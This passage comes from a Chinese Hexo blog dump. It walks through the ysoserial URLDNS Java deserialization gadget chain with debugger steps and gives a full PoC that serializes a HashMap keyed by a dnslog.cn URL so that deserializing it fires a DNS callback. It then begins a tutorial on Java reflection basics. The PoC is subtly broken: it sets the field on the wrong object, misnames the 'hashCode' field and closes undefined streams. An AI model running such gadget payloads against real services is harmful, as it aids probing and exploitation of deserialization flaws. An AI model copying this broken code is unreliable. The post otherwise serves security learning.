class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public Object getObject(final String url) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">               //Avoid DNS resolution during payload creation</span><br><span class="line">               //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br><span class="line">               URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">               HashMap ht = new HashMap(); // HashMap that will contain the URL</span><br><span class="line">               URL u = new URL(null, url, handler); // URL to use as the Key</span><br><span class="line">               ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><span class="line"></span><br><span class="line">               Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><span class="line"></span><br><span class="line">               return ht;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-13.png" title="getObject方法"><br>getObject方法中建立了<code>URLStreamHandler</code>流对象和<code>HashMap</code>对象,其中handler对象为<code>URLStreamHandler</code>的子类<code>SilentURLStreamHandler</code><br><code>URLStreamHandler handler = new SilentURLStreamHandler();</code><br>这次调用的子类<code>SilentURLStreamHandler</code>方法，去规避生成序列化的过程中触发dns，因为调用子类在获取<code>getHostAddress</code>方法时返回<code>Null</code>,并不执行父类<code>URLStreamHandler</code>中的<code>getHostAddress()</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static class SilentURLStreamHandler extends URLStreamHandler &#123;</span><br><span class="line"></span><br><span class="line">        protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected synchronized InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>生成<code>URL对象</code>，并将<code>url参数</code>和<code>URLStreamHandler</code>传入<code>URL对象</code>中<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-14.png" title="建立对象"><br>随后执行<code>HashMap</code>的<code>put()</code>方法,将<code>URL对象</code>作为<code>HashMap值</code>，将<code>url参数值</code>作为<code>key的值</code>存储在<code>HashMap</code>中<br><code>ht.put(u, url);</code><br>再通过反射机制将<code>URL对象</code>的<code>hashCode值</code>设置为-1<br><code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-15.png" title="调用反射机制"><br>最后返回HashMap对象ht<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-16.png" title="返回HashMap对象"><br>在获取HashMap对象后对其进行序列化操作，这边没有设置out定向输出的文件，out就没对应数值,对应命令行最后加<code> &gt; serialize.ser</code>。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-17.png" title="序列化操作"><br>由于<code>HashMap</code>对序列化<code>writeObject()</code>也进行了重写，所以会调用<code>HashMap</code>的序列化方法进行序列化操作，正常的序列化操作。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-18.png" title="序列化操作"><br>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>进行序列化写入<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-19.png" title="序列化操作"></p><p>到此ysoserial工具的URLDNS利用链就执行完成，输出payload序列化的数据。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-20.png" title="生成序列化文件"></p><h2 id="yso-URLDNS链反序列化"><a href="#yso-URLDNS链反序列化" class="headerlink" title="yso-URLDNS链反序列化"></a>yso-URLDNS链反序列化</h2><p>通过对输出的序列化数据，进行反序列化，触发漏洞。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-21.png" title="反序列化触发漏洞"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-22.png" title="DNSLOG接受到数据"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line">public class Payload &#123;</span><br><span class="line">    public static void main(final String[] args) throws Exception&#123;</span><br><span class="line">        ObjectInputStream obj=new ObjectInputStream(new FileInputStream(&quot;C:\\Users\\OKAY\\Desktop\\java-web\\ysoserial\\payload.ser&quot;));</span><br><span class="line">        obj.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03、URLDNS链反序列化分析"><a href="#0x03、URLDNS链反序列化分析" class="headerlink" title="0x03、URLDNS链反序列化分析"></a>0x03、URLDNS链反序列化分析</h1><h2 id="正常反序列化readObject阶段"><a href="#正常反序列化readObject阶段" class="headerlink" title="正常反序列化readObject阶段"></a>正常反序列化readObject阶段</h2><p>这里就跟着payload的反序列化进行分析下去吧，（当然也可以直接在HashMap重写的readObject方法进行下断点，可以直接分析反序列化触发的漏洞），这里从头来可以理解一下运行流程，但前些正常的反序列化过程比较长有些就略过了，记录下关键的步入点吧。<br>反序列化处下断点，debug运行<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-30.png" title="下断点"><br>运行后，需要强行步入（Alt+Shift+F7）readObject方法，注：步入会直接跳过<br>进入后，还需要再次强行步入进入readObject方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-31.png" title="readObject方法"><br>进入后，前面都是正常的一些判断，步过直到调用<code>readObject0()</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-31.png" title="readObject0方法"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-32.png" title="readObject0方法"><br>进入readObject0()方法，然后又是一系列的正常操作和判断，再关注到TC的判断如下图，由于TC为Obeject对象，并非String类对象，所以判断为false，进入调用readOrdinaryObject方法（读取二进制数据）<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-33.png" title="readObject0方法"><br>进入readOrdinaryObject方法，这里读取序列化数据，并将序列化数据赋值给对象<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-34.png" title="readOrdinaryObject方法"><br>后面将对象进行实例化并进行一些判断操作，一直到进入<code>readSerialData</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-35.png" title="readOrdinaryObject方法"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-36.png" title="readSerialData方法"><br><code>readSerialData</code>方法对序列化数据进行读取，一直到调用<code>invokeReadObject</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-38.png" title="invokeReadObject方法"><br>通过反射invoke去判断对象是否有重写readObject方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-39.png" title="invokeReadObject方法"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-40.png" title="invokeReadObject方法"><br>返回<code>ma.invoke</code>，跟进查看<code>ma.invoke</code><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-41.png" title="invokeReadObject方法"><br>返回<code>delegate.invoke</code>,跟进<code>delegate.invoke</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-42.png" title="invokeReadObject方法"><br>获得返回<code>HashMap</code>重写的<code>readObject</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-43.png" title="invokeReadObject方法"><br>跟进返回的<code>invoke0</code>,便进入调用的<code>HashMap</code>重写的<code>readObject</code>方法<br>到这里，进入<code>HashMap</code>重写的<code>readObject()</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-23.png" title="重写的readObject()方法"></p><h2 id="HashMap反序列化readObject阶段"><a href="#HashMap反序列化readObject阶段" class="headerlink" title="HashMap反序列化readObject阶段"></a>HashMap反序列化readObject阶段</h2><p>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>的值，并反序列化读取还原<code>key</code>和<code>value</code>的值，随后进行<code>hash()</code>运算保证唯一<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-24.png" title="获取key和value值"><br>跟进<code>hash()</code>,hash方法判断key是否为空，不为空就调用<code>URL</code>类中的<code>hashcode()</code>方法，key值为url如下图标识所示<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-25.png" title="hash()方法"><br>跟进当前<code>hashcode()</code>方法，会首先判断hashcode是否为-1,为-1则进入<code>URLStreamHandler流对象的hashcode()</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-26.png" title="hashcode()方法"><br>流对象的<code>hashcode()</code>调用了<code>getHostAddress()</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-27.png" title="hashcode()方法"><br>跟进<code>getHostAddress()</code>方法，返回URL类的<code>u.getHostAddress()</code>方法<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-28.png" title="getHostAddress()"><br>跟进<code>u.getHostAddress()</code>方法，调用<code>getByName()</code>从而解析请求dnslog，导致漏洞触发。<br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-44.png" title="dnslog请求"><br><img src="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/url-29.png" title="dnslog请求"><br>到此URLDNS链的反序列化触发访问dnslog就完成。</p><h2 id="总结URLDNS反序列化链流程"><a href="#总结URLDNS反序列化链流程" class="headerlink" title="总结URLDNS反序列化链流程"></a>总结URLDNS反序列化链流程</h2><ol><li><code>ObjectInputStream</code>读取<code>HashMap</code>的序列化文件</li><li>通过正常<code>Object</code>流<code>readObject</code>反序列化文件获取二进制数据</li><li>对二进制序列化数据进行读取并建立实例对象</li><li>通过对实例对象判断是否存在重写方法</li><li>获取到<code>HashMap</code>对象重写反序列化<code>readObject</code>方法，跳转执行该对象的<code>readObject</code>方法。</li><li>遍历序列化<code>Key</code>和<code>value</code>值，进行<code>hash</code>运算</li><li><code>hash</code>方法中<code>key</code>不为空时，调用<code>URL</code>类的<code>hashcode</code>方法</li><li>当<code>hashcode</code>等于-1时，调用<code>URLStreamHandler</code>流的<code>hashcode</code>方法</li><li><code>hashcode</code>方法中调用了<code>getHostAddress()</code>方法</li><li><code>getHostAddress()</code>方法返回<code>URL</code>类的<code>u.getHostAddress()</code>,</li><li><code>URL</code>类的<code>getHostAddress()</code>方法调用<code>getByName()</code>方法从而解析请求dns</li></ol><p><strong>其中步骤1-5为正常反序列化的读取步骤，6-11为获取HashMap对象执行重写readObject方法步骤。</strong></p><h1 id="0x04、POC编写"><a href="#0x04、POC编写" class="headerlink" title="0x04、POC编写"></a>0x04、POC编写</h1><p>通过上述过程可以理出来代码重要步骤。<br>主要生成HashMap对象和URL对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap hm=new HashMap();</span><br><span class="line">URL u=new URL(&quot;http://yuk9sy.dnslog.cn&quot;);</span><br></pre></td></tr></table></figure><p>并通过反射控制URL类中hashcode的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Field code = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashcode&quot;);  //通过反射去控制hashcode值</span><br><span class="line">       code.setAccessible(true); //突破封装访问私有变量</span><br></pre></td></tr></table></figure><p>放入hashMap put值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hm.put(u,123);  //设置HashMap键值对</span><br></pre></td></tr></table></figure><p>通过设置hashcode为-1去触发dns请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code.set(code,-1);  //通过设置hashcode为-1去触发dns请求</span><br></pre></td></tr></table></figure><p>然后就是序列化HashMap对象，最后反序列化。<br>完整POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(final String[] args) throws Exception&#123;</span><br><span class="line">        HashMap hm=new HashMap(); //创建HashMap对象</span><br><span class="line">        URL u=new URL(&quot;http://yuk9sy.dnslog.cn&quot;); //创建URL对象</span><br><span class="line">        Field code = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashcode&quot;);  //通过反射去控制hashcode值</span><br><span class="line">        code.setAccessible(true); //突破封装访问私有变量</span><br><span class="line">        code.set(code,1); //将hashcode设置不为-1，避免在序列化生成过程触发dns</span><br><span class="line">        hm.put(u,123);  //设置HashMap键值对</span><br><span class="line">        code.set(code,-1); //将hashcode值设置为-1 , 确保在反序列化的时候触发dns</span><br><span class="line"></span><br><span class="line">        try&#123;</span><br><span class="line">            //序列化过程</span><br><span class="line">            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./payload.ser&quot;));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            //反序列化过程</span><br><span class="line">            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./payload.ser&quot;));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w">https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w</a><br><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识java反射</title>
      <link href="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/"/>
      <url>/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>学习java基础知识记录，方便查阅。</p><h1 id="0x01、反射基础"><a href="#0x01、反射基础" class="headerlink" title="0x01、反射基础"></a>0x01、反射基础</h1><h2 id="一、反射概念"><a href="#一、反射概念" class="headerlink" title="一、反射概念"></a>一、反射概念</h2><blockquote><p>java执行分为<font color=red>编译期</font>和<font color=red>运行期</font><br><font color=red>编译期</font>是指把源码交给编译器编译成计算机可以执行的文件的过程。在 Java 中也就是把 Java 代码编成 class 文件的过程。编译期只是做了一些翻译功能，并没有把代码放在内存中运行起来，而只是把代码当成文本进行操作，比如检查错误。</p><p><font color=red>运行期</font>是把编译后的文件交给计算机执行，直到程序运行结束。所谓运行期就把在磁盘中的代码放到内存中执行起来。</p></blockquote><p>Java 反射机制是在<font color=red>运行状态</font>中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制。简单来说，反射机制指的是程序在运行时能够获取自身的信息。在 Java 中，只要给定类的名字，就可以通过反射机制来获得类的所有信息。</p><p><strong>Java 反射机制主要提供了以下功能，这些功能都位于<code>java.lang.reflect</code>包。</strong></p><ul><li>在运行时判断任意一个对象所属的类。</li><li>在运行时构造任意一个类的对象。</li><li>在运行时判断任意一个类所具有的成员变量和方法。</li><li>在运行时调用任意一个对象的方法。</li><li>生成动态代理。</li></ul><p><strong>反射与常用引用类对象区别</strong><br>正常方式：引入对应的包类名称——&gt;通过new实例化——&gt;获取实例化对象<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-1.png" title="正常实现"></p><p>反射方式：实例化类对象——&gt;Class获取方法——&gt;得到完整的包类名称<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-4.png" title="反射实现"></p><p><strong>Java反射机制的优缺点</strong><br>优点：</p><ul><li>能够运行时<font color=red>动态获取类的实例</font>，大大提高系统的<font color=red>灵活性</font>和<font color=red>扩展性</font>。</li><li>与Java动态编译相结合，可以实现无比强大的功能。</li><li>降低代码程序之间的依赖性。</li><li>对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</li></ul><p>缺点：</p><ul><li>反射会<font color=red>消耗一定的系统资源</font>，因此，如果不需要动态地创建一个对象，那么就不需要用反射；</li><li>冗余了很多代码量。</li><li>反射调用方法时可以忽略权限检查，获取这个类的私有方法和属性，因此可能会破坏类的封装性而导致安全问题。</li></ul><h2 id="二、反射实现"><a href="#二、反射实现" class="headerlink" title="二、反射实现"></a>二、反射实现</h2><h3 id="1、总结简述"><a href="#1、总结简述" class="headerlink" title="1、总结简述"></a>1、总结简述</h3><font color=red><p><strong>1、通过Class类获取类。</strong><br><strong>2、通过newInstance()对类进行实例化。</strong><br><strong>3、通过Field访问成员变量|通过Method访问成员方法|通过Constructor访问成员构造方法</strong></p></font><p>注：如果实例类存在构造方法，newInstance()实例化必须保证实例类存在无参构造方法，如只有有参构造方法，newInstance()会报错。Java9以后推荐用clazz.getDeclaredConstructor().newInstance()方式即获取构造方法后再实例化，而非直接newInstance()。</p><p><strong>反射机制重要的类</strong></p><table><thead><tr><th align="center">类</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">java.lang.Class</td><td align="left">代表整个字节码。代表一个类型，代表整个类。</td></tr><tr><td align="center">java.lang.reflect.Method</td><td align="left">代表字节码中的方法字节码。代表类中的方法。</td></tr><tr><td align="center">java.lang.reflect.Constructor</td><td align="left">代表字节码中的构造方法字节码。代表类中的构造方法（方法名同类名相同且无参的方法）。</td></tr><tr><td align="center">java.lang.reflect.Field</td><td align="left">代表字节码中的属性字节码。代表类中的成员变量（静态变量+实例变量）。</td></tr></tbody></table><p><font color=red>必须通过Class获取类过后才能获取Method、Constructor、Field</font><br>也就是说Class是反射实现的前提。且Class并不是new出来的，而是java内置的。</p><h3 id="2、Class访问类"><a href="#2、Class访问类" class="headerlink" title="2、Class访问类"></a>2、Class访问类</h3><p><strong>Class获取方式</strong></p><table><thead><tr><th align="center">方式</th><th align="center">示例注解</th></tr></thead><tbody><tr><td align="center">Class.forName(“完整类名带包名”)</td><td align="center">Class A&#x3D;Class.forName(“com.java.reflect.people”);</td></tr><tr><td align="center">对象.getClass()</td><td align="center">people peo&#x3D;new people();Class A&#x3D;peo.getClass();</td></tr><tr><td align="center">任何类型.class</td><td align="center">Class A &#x3D; String.class;</td></tr></tbody></table><p><strong>反射类可访问的常用方法</strong><br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-2.png" title="常用方法"></p><p><strong>代码实现</strong><br>people类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class people implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String phone;</span><br><span class="line">    private int age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">public class reflect &#123;</span><br><span class="line">    public static void main (String[] args) throws Exception&#123;</span><br><span class="line">        //1、使用反射.forName(&quot;完整类名&quot;)获取类</span><br><span class="line">        Class people1=Class.forName(&quot;com.javaweb.reflect.people&quot;);</span><br><span class="line">        System.out.println(&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;+people1.getName());</span><br><span class="line">        //2、使用反射 对象.getClass()获取类</span><br><span class="line">        people pl=new people();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(&quot;使用对象.getClass()获取类 的类名&quot;+people2.getName());</span><br><span class="line">        //3、使用反射 任何类型.class获取类</span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(&quot;使用任何类型.class获取类 的类名&quot;+people3.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三种获取类的实现截图：<br><img src="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/jc-4.png" title="Class类获取"></p><h3 id="2、Field访问成员变量"><a href="#2、Field访问成员变量" class="headerlink" title="2、Field访问成员变量"></a>2、Field访问成员变量</h3><p>通过下列任意一个方法访问成员变量时将返回 Field 类型的对象或数组。<br><strong>Field声明使用的方法</strong></p><table><thead><tr><th align="center">Field声明时的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getFields()</td><td align="center">获取所有权限为public的成员变量</td></tr><tr><td align="center">getField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr><tr><td align="center">getDeclaredFields()</td><td align="center">获取当前对象的所有成员变量</td></tr><tr><td align="center">getDeclaredField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr></tbody></table><p>注：针对private私有的变量，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有变量</p><p><strong>Field常用方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获得该成员变量的名称</td></tr><tr><td align="center">getType()</td><td align="left">获取表示该成员变量的 Class 对象</td></tr><tr><td align="center">get(Object obj)</td><td align="left">获得指定对象 obj 中成员变量的值，返回值为 Object 类型</td></tr><tr><td align="center">set(Object obj, Object value)</td><td align="left">将指定对象 obj 中成员变量的值设置为 value</td></tr><tr><td align="center">getlnt(0bject obj)</td><td align="left">获得指定对象 obj 中成员类型为 int 的成员变量的值</td></tr><tr><td align="center">setlnt(0bject obj, int i)</td><td align="left">将指定对象 obj 中成员变量的值设置为 i</td></tr><tr><td align="center">setFloat(Object obj, float f)</td><td align="left">将指定对象 obj 中成员变量的值设置为 f</td></tr><tr><td align="center">getBoolean(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 boolean 的成员变量的值</td></tr><tr><td align="center">setBoolean(Object obj, boolean b)</td><td align="left">将指定对象 obj 中成员变量的值设置为 b</td></tr><tr><td align="center">getFloat(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 float 的成员变量的值</td></tr><tr><td align="center">setAccessible(boolean flag)</td><td align="left">此方法可以设置是否忽略权限直接访问 private 等私有权限的成员变量</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 